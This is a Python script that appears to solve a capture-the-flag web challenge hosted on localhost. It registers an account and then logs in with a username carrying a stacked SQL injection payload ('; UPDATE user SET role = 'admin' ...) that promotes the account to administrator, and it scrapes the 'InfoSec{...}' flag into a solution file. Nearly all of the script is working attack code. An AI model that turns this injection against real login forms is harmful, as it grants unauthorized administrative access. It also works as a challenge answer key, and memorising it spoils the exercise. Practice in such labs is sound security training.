#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8080"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # Create new session
    new_session = requests.Session()
   
    # Target user
    username = "abi"
    password = "pass123*"
    login_data = {'username': username, 'password': password}

    # Create user
    new_session.post(url + "/register", data = login_data)

    # SQL Injection - Update target user's role (to admin)
    payload = "'; UPDATE user SET role = 'admin' WHERE username = '" + username
    sqli_login_data = {'username': username + payload, 'password': password}
    raw_flag_data = new_session.post(url + "/login", data = sqli_login_data)

    # Cut out the flag
    raw_flag_data_str = str(raw_flag_data.text)
    flag = ''.join(flag_regex.findall(raw_flag_data_str))

    # Save flag to solution file
    sol = open("solution.txt", "w")
    sol.write(flag)
    sol.close()

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
